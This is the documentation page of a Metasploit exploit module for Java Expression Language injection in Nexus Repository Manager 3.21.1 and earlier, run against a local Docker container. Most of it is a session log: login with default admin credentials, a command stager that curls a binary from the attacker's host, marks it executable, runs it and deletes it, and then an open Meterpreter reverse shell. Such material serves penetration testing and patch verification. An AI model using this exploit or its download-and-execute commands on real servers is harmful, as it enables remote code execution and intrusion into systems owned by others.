## Vulnerable Application

### Description

This module exploits a Java Expression Language (EL) injection in Nexus
Repository Manager versions up to and including 3.21.1 to execute code
as the "nexus" user.

### Setup

Run `docker run -d -p 8081:8081 --name nexus sonatype/nexus3:3.21.0`
(note the added `3.21.0` tag) as per Sonatype's [Docker Hub instructions](https://hub.docker.com/r/sonatype/nexus3/#running).

### Targets

```
Id  Name
--  ----
0   Nexus Repository Manager <= 3.21.1
```

## Verification Steps

Follow [Setup](#setup) and [Scenarios](#scenarios).

## Options

### USERNAME

Set this to a valid Nexus username.

### PASSWORD

Set this to a valid Nexus password.

## Scenarios

### Nexus Repository Manager 3.21.1-05 from [Docker Hub](https://hub.docker.com/r/sonatype/nexus3)

```
msf5 > use exploit/linux/http/nexus_repo_manager_el_injection
msf5 exploit(linux/http/nexus_repo_manager_el_injection) > show missing

Module options (exploit/linux/http/nexus_repo_manager_el_injection):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'


Payload options (linux/x64/meterpreter_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)

msf5 exploit(linux/http/nexus_repo_manager_el_injection) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf5 exploit(linux/http/nexus_repo_manager_el_injection) > set lhost 192.168.1.3
lhost => 192.168.1.3
msf5 exploit(linux/http/nexus_repo_manager_el_injection) > run

[*] Started reverse TCP handler on 192.168.1.3:4444
[*] Executing automatic check (disable AutoCheck to override)
[+] The target appears to be vulnerable. Nexus 3.21.0-05 is a vulnerable version.
[*] Logging in with admin:admin
[+] Logged in with NXSESSIONID=b15d9cfc-f8ad-4aba-b203-c36aa78e4670;
[*] Using URL: http://0.0.0.0:8080/SjSMKKomKhhGj
[*] Local IP: http://192.168.1.3:8080/SjSMKKomKhhGj
[*] Generated command stager: ["curl -so /tmp/dXZVXFXS http://192.168.1.3:8080/SjSMKKomKhhGj", "chmod +x /tmp/dXZVXFXS", "/tmp/dXZVXFXS", "rm -f /tmp/dXZVXFXS"]
[*] Executing command: curl -so /tmp/dXZVXFXS http://192.168.1.3:8080/SjSMKKomKhhGj
[*] Client 192.168.1.3 (curl/7.61.1) requested /SjSMKKomKhhGj
[*] Sending payload to 192.168.1.3 (curl/7.61.1)
[+] Successfully executed command: curl -so /tmp/dXZVXFXS http://192.168.1.3:8080/SjSMKKomKhhGj
[*] Command Stager progress -  52.63% done (60/114 bytes)
[*] Executing command: chmod +x /tmp/dXZVXFXS
[+] Successfully executed command: chmod +x /tmp/dXZVXFXS
[*] Command Stager progress -  71.93% done (82/114 bytes)
[*] Executing command: /tmp/dXZVXFXS
[+] Successfully executed command: /tmp/dXZVXFXS
[*] Command Stager progress -  83.33% done (95/114 bytes)
[*] Executing command: rm -f /tmp/dXZVXFXS
[+] Successfully executed command: rm -f /tmp/dXZVXFXS
[*] Meterpreter session 1 opened (192.168.1.3:4444 -> 192.168.1.3:62404) at 2020-04-04 00:39:23 -0500
[*] Command Stager progress - 100.00% done (114/114 bytes)
[*] Server stopped.

meterpreter > getuid
Server username: no-user @ 5c29594842aa (uid=200, gid=200, euid=200, egid=200)
meterpreter > sysinfo
Computer     : 172.17.0.2
OS           : Red Hat Enterprise Linux 8 (Linux 4.19.76-linuxkit)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter >
```
